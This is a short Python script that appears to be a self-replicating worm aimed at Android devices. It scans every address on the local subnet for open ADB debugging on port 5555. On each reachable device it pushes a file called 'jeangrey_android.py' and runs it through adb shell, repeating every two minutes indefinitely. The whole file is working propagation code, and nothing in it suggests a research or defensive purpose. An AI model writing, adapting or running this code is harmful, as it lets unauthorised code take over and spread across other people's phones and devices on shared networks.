import os
import time
import subprocess
import socket

ADB_PAYLOAD = "/sdcard/Download/jeangrey_android.py"

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except:
        return "127.0.0.1"
    finally:
        s.close()

def scan_subnet():
    local_ip = get_local_ip()
    subnet = ".".join(local_ip.split(".")[:3])
    live_hosts = []
    for i in range(1, 255):
        ip = f"{subnet}.{i}"
        result = subprocess.run(["adb", "connect", f"{ip}:5555"], capture_output=True, text=True)
        if "connected" in result.stdout.lower():
            live_hosts.append(ip)
    return live_hosts

def replicate(ip):
    subprocess.run(["adb", "connect", f"{ip}:5555"], capture_output=True)
    subprocess.run(["adb", "push", ADB_PAYLOAD, "/sdcard/Download/jeangrey_android.py"], capture_output=True)
    subprocess.run(["adb", "shell", "python /sdcard/Download/jeangrey_android.py"], capture_output=True)

def main():
    while True:
        targets = scan_subnet()
        for ip in targets:
            replicate(ip)
        time.sleep(120)

if __name__ == "__main__":
    main()
